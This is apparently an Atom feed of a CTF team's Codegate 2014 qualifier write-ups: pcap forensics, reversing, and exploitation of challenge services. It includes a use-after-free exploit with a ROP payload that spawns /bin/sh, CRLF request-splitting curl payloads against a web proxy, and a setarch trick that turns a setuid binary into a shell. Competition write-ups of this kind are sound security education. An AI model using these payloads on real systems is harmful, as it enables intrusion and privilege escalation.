<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[blue-lotus]]></title>
  <link href="http://www.blue-lotus.net//atom.xml" rel="self"/>
  <link href="http://www.blue-lotus.net//"/>
  <updated>2014-02-25T13:46:00+08:00</updated>
  <id>http://www.blue-lotus.net//</id>
  <author>
    <name><![CDATA[blue-lotus]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 weirdshark writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-weirdshark-writeup</id>
    <content type="html"><![CDATA[<p>A pcap file is given here for analysis. check type using <code>file</code></p>

<pre><code># file weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7
weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7: pcap-ng capture file - version 1.0
</code></pre>

<p>Open the file using wireshark, but no luck, wireshark reports malformed file format and refuse to open it.</p>

<p>So we need to extract the packets inside manually.</p>

<!-- more -->

<p>Soon I got the file format document <a href="https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html">here</a>, the file format is really simple, it’s organized in blocks, and according to my comprehension, each block contains a single network frame packet.</p>

<p>According to <code>general block structure</code> section in the pcap document, we can easily get the block type, length, and content.</p>

<p>And as for the packet, there are several levels of network protocol headers, a brief hex view shows that the network traffic are HTTP requests and responses, so the protocol stack should be IP + TCP + HTTP</p>

<pre><code>| 6 + 6 bytes MAC addr + 2 bytes (ethertype 08 00) | 20 bytes IP header | 20 bytes TCP header | HTTP Header + HTTP Body |
</code></pre>

<p>the hard thing here to do manually pcap parse is to assemble TCP packets into byte stream, which require a good understanding of TCP control sequence. But we can assume that the network condition is good, no packet loss or retranssmission happens, just assemble them one by one and see what happens.</p>

<p>use the following python code to extract all http content</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class="line">
</span><span class="line"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class="line"><span class="n">total</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># skip the first two blocks, which seems broken, 0x80 and 0x9c are the block sizes respectively</span>
</span><span class="line"><span class="n">index</span> <span class="o">=</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="mh">0x9c</span>
</span><span class="line">
</span><span class="line"><span class="n">w</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;http-content.bin&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">total</span><span class="p">:</span>
</span><span class="line">    <span class="n">block_type</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
</span><span class="line">    <span class="n">block_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line">    <span class="n">captured_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">20</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">24</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line">    <span class="n">packet_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">24</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">28</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line">    <span class="k">print</span> <span class="n">index</span><span class="p">,</span> <span class="n">block_size</span><span class="p">,</span> <span class="n">packet_len</span><span class="p">,</span> <span class="n">captured_len</span><span class="p">,</span> <span class="n">block_type</span>
</span><span class="line">    <span class="n">w</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">28</span><span class="o">+</span><span class="mi">54</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">28</span><span class="o">+</span><span class="n">packet_len</span><span class="p">])</span>
</span><span class="line">    <span class="n">w</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span><span class="line">    <span class="n">index</span> <span class="o">+=</span> <span class="n">block_size</span>
</span><span class="line">
</span><span class="line"><span class="n">w</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The result seems very promising,  just concat the packet contents one by one really works! which indicates the network condition is really good. There are several http requests inside</p>

<pre><code>GET / HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /mario.png HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /obama.bmp HTTP/1.1
GET /codegate.jpg HTTP/1.1
GET /multiple.pdf HTTP/1.1
GET /grayhash.jpg HTTP/1.1
</code></pre>

<p>And to my surprise, the flag is not in <code>codegate.jpg</code>, but in <code>multiple.pdf</code></p>

<p>FLAG = <code>FORENSICS_WITH_HAXORS</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 weird_snus writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-weird_snus-writeup</id>
    <content type="html"><![CDATA[<h2 id="vulnerabilities">vulnerabilities</h2>
<ol>
  <li>Password protection can be easily bypassed by giving a input of ‘0x00’</li>
  <li>We quickly identified there is a use-after-free bug. After verifying the password, the program runs into an endless command processing mode, where user can input various buffer command to do some strange things. The first letter in each command represents the action to perform. Command A will check if a struct pointer exists, if so, it will call the function pointer in the struct, or it will allocate a new struct. Command D will reallocate the struct can free it later without cleat the struct pointer. So fist calling command D, and then calling command A will trigger a use-after-free crash. If we find somewhere to do the similar size malloc and fill the struct including the function pointer, we could hijack the control of the program.</li>
</ol>

<h2 id="exploitation">Exploitation</h2>

<p>Luckily we found that there is a command M can do arbitrary size allocation. The path of current working directory will be put in the content of the new allocation. So we can construct a directory, whose path contains evil function pointer. Then we trigger the use-after-free bug mentioned above.</p>

<p>To get a shell, we first put a large amount of ROP payload(system(‘/bin/sh’)) in the environment variable,
and then we use an <code>add esp</code> gadget in the libc to raise the stack to the place where environment variables are stored in. <code>ulimit -s unlimited</code> trick is used to get rid of libc address randomization.</p>

<h2 id="code">Code</h2>

<h3 id="important-addresses">important addresses</h3>

<pre><code>system: 0x40079260 
binsh: 0x401a1b98

11817d:       81 c4 8c 22 00 00       add    $0x228c,%esp
0x40079260 - 0x41260 + 0x11817d 0x4015017d   \x7d\x01\x15\x40
</code></pre>

<h3 id="commands">commands</h3>
<p>Disable libc randomization:</p>

<pre><code>ulimit -s unlimited
</code></pre>

<p>Create a directory and cd to it:</p>

<pre><code>python -c 'import os; os.makedirs("/tmp/aaaa/aa\x7d\x01\x15\x40")'
</code></pre>

<p>Set ROP payloads in an environment variable and trigger use-after-free bug. Notice that the python variable <code>o</code> should be adjusted to achieve the stack alignment. The number below is just an example.</p>

<pre><code>export EXPLOIT=$(python -c 'o = 4; print "a" * o + "\x60\x92\x07\x40\x60\x92\x07\x40\x98\x1b\x1a\x40\x98\x1b\x1a\x40" * 2000+"a" * (8 - o)'); (python -c 'print "\x00\nkelwin\nA\nM\nG\x10\x00\x00\x00\nA\n"'; echo "cat /home/strongest_snus/flag"; cat ) | /home/strongest_snus/weird_snus \(
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 Web Proxy writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-web_proxy-writeup</id>
    <content type="html"><![CDATA[<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">http://58.229.183.25/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Here is a GET param named “url”, we could use it to get some header and body informaiton of a webpage.</p>

<p>and in the index.php’s source code, we can find this:</p>

<pre><code>&lt;!-- admin/index.php --&gt;
</code></pre>

<p>So it’s clear that we will use that GET param “url” to access /admin/index.php</p>

<p>use “localhost” instead of “58.229.183.25”, and find out that a %0a(\n) will make the body information appears in header field, so there maybe some “http response splitting” trick</p>

<p>after several test, we use two step to got the key.</p>

<p>first step:</p>

<pre><code>DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20localhost%0aRange:%20bytes=370-%0a%0a
 &lt;html&gt;
 &lt;head&gt;
      &lt;style type="text/css"&gt;
      body { margin:0; }
      * { font-family:fantasy; }
      p { height:50pt; font-size:50pt; background:green;  }
      input[type=text] { width:500; font-size:15pt; }
      input[type=submit] { width:150; font-size:15pt; }
      input[type=submit]:hover { background:lightblue; }
      table { font-size:15pt; border:0;}
      .err { background:yellow; font-weight:bold; }
      #l:hover{ color:white; font-weight:bold; }
      &lt;/style&gt;
      &lt;title&gt;Web proxy&lt;/title&gt;
 &lt;/head&gt;
 &lt;body bgcolor=gray&gt;&lt;br&gt;
 &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
 &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
 Host: localhost
 Range: bytes=370-

 '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
 Date: Sat, 22 Feb 2014 16:11:08 GMT
 Server: Apache/2.4.6 (Ubuntu)
 X-Powered-By: PHP/5.5.3-1ubuntu2.1
 Vary: Accept-Encoding
 Content-Range: bytes 370-429/430
 Content-Length: 60
 Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;

 0
 &lt;!--if($_SERVER[HTTP_HOST]=="hackme")--&gt;&lt;/body&gt;
 .
 .
 .
 .
 .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
 &lt;!-- admin/index.php --&gt;
 &lt;/body&gt;
 &lt;/html&gt;
</code></pre>

<p>second step:</p>

<pre><code>     DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20hackme%0aRange:%20bytes=80-%0a%0a
 &lt;html&gt;
 &lt;head&gt;
      &lt;style type="text/css"&gt;
      body { margin:0; }
      * { font-family:fantasy; }
      p { height:50pt; font-size:50pt; background:green;  }
      input[type=text] { width:500; font-size:15pt; }
      input[type=submit] { width:150; font-size:15pt; }
      input[type=submit]:hover { background:lightblue; }
      table { font-size:15pt; border:0;}
      .err { background:yellow; font-weight:bold; }
      #l:hover{ color:white; font-weight:bold; }
      &lt;/style&gt;
      &lt;title&gt;Web proxy&lt;/title&gt;
 &lt;/head&gt;
 &lt;body bgcolor=gray&gt;&lt;br&gt;
 &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
 &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
 Host: hackme
 Range: bytes=80-

 '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
 Date: Sat, 22 Feb 2014 15:51:11 GMT
 Server: Apache/2.4.6 (Ubuntu)
 X-Powered-By: PHP/5.5.3-1ubuntu2.1
 Vary: Accept-Encoding
 Content-Range: bytes 80-126/127
 Content-Length: 47
 Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;

 word is WH0_IS_SnUS_bI1G_F4N
 &lt;/body&gt;
 .
 .
 .
 .4
 .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
 &lt;!-- admin/index.php --&gt;
 &lt;/body&gt;
 &lt;/html&gt;
</code></pre>

<p>Password is WH0_IS_SnUS_bI1G_F4N</p>

<p>Cheers :)          </p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 Clone Technique writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-clone_technique-writeup</id>
    <content type="html"><![CDATA[<p>Clone_Techique is a 250 points reverseme. The given program is a win32 PE. </p>

<p>After load it in IDA pro, we can see the main function contains a loop which calls <code>CreateProcessW</code> many many times, that explains the title “clone technique”. Before <code>CreateProcessW</code>, command string is prepared by <code>wsnprintf</code>, in which add some arguements when create new process. Except that, nothing special in main function.</p>

<pre><code>if ( (unsigned int)count &lt;= 0xD0000000 )
{
    count = v1;
    dword_409754 = v6;
    GetModuleFileNameW(0, &amp;Filename, 0x12Cu);
    do
    {
        if ( (unsigned int)dword_409758 &gt; 0x190 )
        return 0;
        ++dword_409758;
        wsprintfW(&amp;CommandLine, L"\"%s\" %u %u %u", &amp;Filename, v1, v6, dword_409758);
        CreateProcessW(0, &amp;CommandLine, 0, 0, 0, 0, 0, 0, &amp;StartupInfo, &amp;ProcessInformation);
        WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFFu);
        GetExitCodeProcess(ProcessInformation.hProcess, &amp;ExitCode);
        v1 = ExitCode;
        v6 = sub_401280(ExitCode ^ v6, ExitCode % 0x1E);
    }
    while ( ExitCode );
    result = 0;
}
</code></pre>

<p>It took me sometime to figure out where to store the flag. Finally I notice a strange string near the const string used by <code>wsprintfW</code>.</p>

<pre><code>.data:00407030 magic_string    db 0Fh,'帪9=^?▃h',0Ch,'=嫮判{',9,'4叮g],0,0
.data:00407030                                         ; DATA XREF: sub_401160+90o
.data:0040704C ; const WCHAR aSUUU
.data:0040704C aSUUU:                                  ; DATA XREF: real_main+128o
.data:0040704C                 unicode 0, &lt;"%s" %u %u %u&gt;,0
.data:00407068                 align 10h
</code></pre>

<p>Using Xref, IDA lead me to a interesting function. Noticing the <code>GetCommandLineW</code> call and <code>WriteProcessMemory</code> call, I believe it should be the key functin. </p>

<p>But there is some anti-decompile technique disable IDA to decompile this function. </p>

<pre><code>add     esp, 80h
sub     esp, 80h
</code></pre>

<p>By filling the line shown above with nop. The IDA successfully decompile it.</p>

<pre><code>v0 = GetCommandLineW();
v5 = CommandLineToArgvW(v0, &amp;pNumArgs);
if ( pNumArgs == 4 )
{
    Buffer = _wtoi(v5[1]);
    v7 = _wtoi(v5[2]);
    dword_409758 = _wtoi(v5[3]);
}
else
{
    Buffer = 0xA8276BFAu;
    v7 = 0x92F837EDu;
    dword_409758 = 1;
}
memset(sub_401070(&amp;magic_string, Buffer, v7), 0, 28u);
Buffer ^= 0xB72AF098u;
v7 ^= v7 * Buffer;
lpBaseAddress = (char *)&amp;unk_409748 + 4;
WriteProcessMemory((HANDLE)0xFFFFFFFF, (char *)&amp;unk_409748 + 4, &amp;Buffer, 4u, &amp;NumberOfBytesWritten);
lpBaseAddress = (char *)&amp;unk_409750 + 4;
return WriteProcessMemory((HANDLE)0xFFFFFFFF, (char *)&amp;unk_409750 + 4, &amp;v7, 4u, &amp;NumberOfBytesWritten);
</code></pre>

<p>It is clear that the program compute the magic string with arguments. And then memset the new string with 0 immediately. The new string is very likely to be the flag. But we must know the correct arguements. Next step we need to find out the all the arguements when createprocess</p>

<p>Using procmon, it is easy to monitor all newlly created process and log them. Export them all into XML file, and do some scripting, and then we get all the arguements when create process.</p>

<p><img src="http://www.blue-lotus.net/images/2013/procmon.png" alt="1" /></p>

<p>Now it very close to the flag, but for me the pain just begins. Not familiar with debugging multi-process in windows, I decide to totally reverse the compute function. Luckily, with help of IDA it’s not that diffcult, but still took me some time. </p>

<p>The most frustrating part is the ROL function provided by IDA don’t behave the same with the reverseme. Using a debugger, I set a breakpoint at the key function and compare the results of my own code and that of reverseme. </p>

<p>With a rewritten key function, just enumerate all the parameters we dumped. Look over the 800+ results, we find:</p>

<pre><code>And Now His Watch is Ended
</code></pre>

<p>That’s the flag!</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 chrono writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-chrono-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-chrono-writeup</id>
    <content type="html"><![CDATA[<p>Description</p>

<pre><code>ssh guest@58.229.183.16 / ExtremelyDangerousGuest
</code></pre>

<p>Login, look around</p>

<pre><code>guest@codegate:~$ ls -al
total 20
dr-xr-x--- 2 guest guest 4096 Feb 19 22:49 .
drwxr-xr-x 4 root  root  4096 Feb 22 00:07 ..
lrwxrwxrwx 1 root  root     9 Feb 19 22:22 .bash_history -&gt; /dev/null
-rw-r--r-- 1 root  root   220 Feb 19 22:21 .bash_logout
-rw-r--r-- 1 guest guest 3637 Mar 31  2013 .bashrc
-rw-r--r-- 1 guest guest  675 Mar 31  2013 .profile

guest@codegate:~$ lsattr -a
----i--------e-- ./.profile
----i--------e-- ./.bash_logout
-------------e-- ./..
----i--------e-- ./.
lsattr: Operation not supported While reading flags on ./.bash_history
----i--------e-- ./.bashrc

guest@codegate:/home/chrono$ ls -al
total 924
dr-xr-xr-x 2 chrono chrono   4096 Feb 19 22:24 .
drwxr-xr-x 4 root   root     4096 Feb 22 00:07 ..
lrwxrwxrwx 1 root   root        9 Feb 19 22:24 .bash_history -&gt; /dev/null
-rw-r--r-- 1 chrono chrono    220 Mar 31  2013 .bash_logout
-rw-r--r-- 1 chrono chrono   3637 Mar 31  2013 .bashrc
-rwsr-xr-x 1 chrono chrono 921576 Feb 19 22:13 chrono
-r-------- 1 chrono chrono     28 Feb 22 00:07 key
-rw-r--r-- 1 chrono chrono    675 Mar 31  2013 .profile

guest@codegate:/home/chrono$ lsattr -a
lsattr: Permission denied While reading flags on ./key
----i--------e-- ./.profile
----i--------e-- ./.bash_logout
-------------e-- ./..
----i--------e-- ./.
lsattr: Operation not supported While reading flags on ./.bash_history
----i--------e-- ./chrono
----i--------e-- ./.bashrc
</code></pre>

<p>Nice security</p>

<pre><code>guest@codegate:/home/chrono$ file chrono
chrono: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x8c0628afc74aa0a346020da6d9bbd44bd90709a0, stripped
</code></pre>

<p>Stripped x86_64 binary</p>

<p>To make it readable, feed the remote libc.a and libm.a to Flair, produce signature and apply in IDA</p>

<p>Notice that the timeval struct provided by IDA has wrong size. Both tv_sec and tv_usec should be quad-word</p>

<p>Read, read, read…</p>

<p>The output depends on elapsed milliseconds during select. We have two options:</p>

<ol>
  <li>Solve the equation and controll the timing accurately</li>
  <li>Keep timeout untouched, NaN save the world</li>
</ol>

<p>Read Linux source code <code>fs/select.c</code></p>

<pre><code>SYSCALL_DEFINE5(select, int, n, fd_set __user *, inp, fd_set __user *, outp,
                fd_set __user *, exp, struct timeval __user *, tvp)
{
    struct timespec end_time, *to = NULL;
    struct timeval tv;
    int ret;

    if (tvp) {
        if (copy_from_user(&amp;tv, tvp, sizeof(tv)))
            return -EFAULT;

        to = &amp;end_time;
        if (poll_select_set_timeout(to,
                tv.tv_sec + (tv.tv_usec / USEC_PER_SEC),
                (tv.tv_usec % USEC_PER_SEC) * NSEC_PER_USEC))
            return -EINVAL;
    }

    ret = core_sys_select(n, inp, outp, exp, to);
    ret = poll_select_copy_remaining(&amp;end_time, tvp, 1, ret);

    return ret;
}
</code></pre>

<p>The timeval struct is updated in <code>poll_select_copy_remaining</code></p>

<pre><code>static int poll_select_copy_remaining(struct timespec *end_time, void __user *p,
                                      int timeval, int ret)
{
    struct timespec rts;
    struct timeval rtv;

    if (!p)
        return ret;

    if (current-&gt;personality &amp; STICKY_TIMEOUTS)
        goto sticky;

    ...
    ...

    /*
     * If an application puts its timeval in read-only memory, we
     * don't want the Linux-specific update to the timeval to
     * cause a fault after the select has completed
     * successfully. However, because we're not updating the
     * timeval, we can't restart the system call.
     */

sticky:
    if (ret == -ERESTARTNOHAND)
        ret = -EINTR;
    return ret;
}
</code></pre>

<p>STICKY_TIMEOUTS sounds good. And one more important thing, STICKY_TIMEOUTS bit is not cleared for setuid exec. See Linux source code <code>include/uapi/linux/personality.h</code></p>

<pre><code>/*
 * Security-relevant compatibility flags that must be
 * cleared upon setuid or setgid exec:
 */
#define PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC  | \
                            ADDR_NO_RANDOMIZE  | \
                            ADDR_COMPAT_LAYOUT | \
                            MMAP_PAGE_ZERO)
</code></pre>

<p>So, how to change personality?</p>

<pre><code>guest@codegate:/home/chrono$ setarch --help
Usage: setarch &lt;arch&gt; [options] [program [program arguments]]

Options:
 -h, --help               displays this help text
 -v, --verbose            says what options are being switched on
 -R, --addr-no-randomize  disables randomization of the virtual address space
 -F, --fdpic-funcptrs     makes function pointers point to descriptors
 -Z, --mmap-page-zero     turns on MMAP_PAGE_ZERO
 -L, --addr-compat-layout changes the way virtual memory is allocated
 -X, --read-implies-exec  turns on READ_IMPLIES_EXEC
 -B, --32bit              turns on ADDR_LIMIT_32BIT
 -I, --short-inode        turns on SHORT_INODE
 -S, --whole-seconds      turns on WHOLE_SECONDS
 -T, --sticky-timeouts    turns on STICKY_TIMEOUTS
 -3, --3gb                limits the used address space to a maximum of 3 GB
     --4gb                ignored (for backward compatibility only)
     --uname-2.6          turns on UNAME26

For more information see setarch(8).
</code></pre>

<p>Give it a shot</p>

<pre><code>guest@codegate:/home/chrono$ setarch x86_64 -T ./chrono
cat key

He said :
    import zlib
    zlib.compress(space)



 o
|+|
 !
[ ]




voila!
dIfF3rENT_L3VEL_s4me_aNsW3r
</code></pre>

<p>– EOF –</p>

<pre><code>/*
 * CodeGate 2014 - chrono 300 Point Logical
 *
 * Reverse Engineered by libmaru (libmaru#gmail.com)
 *
 * Build Environment:
 *   Linux codegate 3.11.0-15-generic #25-Ubuntu SMP
 *     Thu Jan 30 17:22:01 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
 *   gcc (Ubuntu/Linaro 4.8.1-10ubuntu9) 4.8.1
 *
 * Build Instruction:
 *   gcc -static -fno-stack-protector -o chrono chrono.c -lm
 *   strip chrono
 *
 * Produce identical binary except Build ID
 *
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;math.h&gt;
#include &lt;sys/select.h&gt;

#define TIMEOUT     299792458
#define PARAM       0.0030000000000000000625L
#define IDEAL_SUM   6.6260690000000002087L
#define PI          3.1415920000000001622L

int main()
{
    long double remain = 0;
    long double param = 0;
    long double item = 0;
    long double sum = 0;
    struct timeval timeout;
    fd_set readfds;
    char buf[256] = {};
    int x,y;
    bool flag = 1;

    timeout.tv_sec  = TIMEOUT / 1000000;
    timeout.tv_usec = TIMEOUT % 1000000;

    FD_ZERO( &amp;readfds );
    FD_SET( 0, &amp;readfds );

    if( select( 1, &amp;readfds, NULL, NULL, &amp;timeout ) &lt;= 0 )
    {
        puts( "no hack." );
        exit( 0 );
    }

    remain = timeout.tv_sec * 1000000 + timeout.tv_usec;
    puts( "\nHe said : \n\timport zlib\n\tzlib.compress(space)" );
    param = ( TIMEOUT - remain ) * PARAM;

    for( y = 10; y &gt;= 0; --y )
    {
        for( x = 0; x &lt;= 45; ++x )
        {
            item = sin( x/param + 4 ) + 5;
            sum += item;

            if( flag &amp;&amp; x &gt; 4 &amp;&amp; x == rint( param * PI ) &amp;&amp; rint( item ) == y-1 )
                flag = 0, putchar('*');
            else if( flag &amp;&amp; x == 45 &amp;&amp; y-1 == rint( item ) )
                putchar('*');
            else if( x &gt; 4 &amp;&amp; x &lt;= 45 &amp;&amp; rint( item ) == y )
                putchar('#');
            else if( x == 1 &amp;&amp; y == 7 )
                putchar('o');
            else if( x == 1 &amp;&amp; y == 6 )
                putchar('+');
            else if( x == 0 &amp;&amp; y == 6 )
                putchar('|');
            else if( x == 2 &amp;&amp; y == 6 )
                putchar('|');
            else if( x == 1 &amp;&amp; y == 5 )
                putchar('!');
            else if( x == 0 &amp;&amp; y == 4 )
                putchar('[');
            else if( x == 2 &amp;&amp; y == 4 )
                putchar(']');
            else
                putchar(' ');
        }
        putchar('\n');
    }

    if( FD_ISSET( 0, &amp;readfds ) )
    {
        fgets( buf, sizeof buf - 1, stdin );
        if( !( sum &gt; IDEAL_SUM ) &amp;&amp; !( sum &lt; IDEAL_SUM ) )
        {
            puts( "voila!" );
            system( buf );
        }
    }

    return 0;
}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 Automata writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-automata-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-automata-writeup</id>
    <content type="html"><![CDATA[<p>First download the executive file automata. Run it and the program requires two things, a command and a code.</p>

<p>Open the file with IDA Pro and locate the references of the string </p>

<pre><code>[=] Welcome to Automata System [=]
</code></pre>

<p>Decompile the context code and find that the program first pass the command and a address to a sub procedure located at 0x1339 (PIE is on).</p>

<p>In this procedure the program calculates the value of the string in base 37 and fill the address given with 3 int values:</p>

<pre><code>+ v1 = 42 - v2 - v3
+ v2 = value_of_the_command % 17 + 1
+ v3 = (value_of_the_command &amp; 0xF) + 1
</code></pre>

<p>Here we know that the length of the code is 43 and its components.</p>

